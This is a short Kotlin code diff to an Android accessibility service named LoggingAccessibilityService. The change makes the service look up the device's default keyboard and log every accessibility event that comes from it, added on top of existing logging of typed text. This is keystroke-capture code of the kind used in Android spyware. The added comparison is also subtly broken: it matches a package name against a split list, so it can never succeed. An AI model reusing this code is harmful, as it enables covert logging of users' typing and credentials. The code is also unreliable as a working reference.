@@ -13,6 +13,7 @@ import android.accessibilityservice.AccessibilityServiceInfo
 import android.app.Service
 import android.content.Intent
 import android.os.Build
+import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 
@@ -31,6 +32,14 @@ class LoggingAccessibilityService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        val method = Settings.Secure.getString(
+                contentResolver,
+                Settings.Secure.DEFAULT_INPUT_METHOD
+        )
+        val keyboardPackageName = method.split("/")
+        if (event.packageName == keyboardPackageName) {
+            logEvent(event, event.toString())
+        }
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 // This event type is fired when text is entered in any EditText that is not a
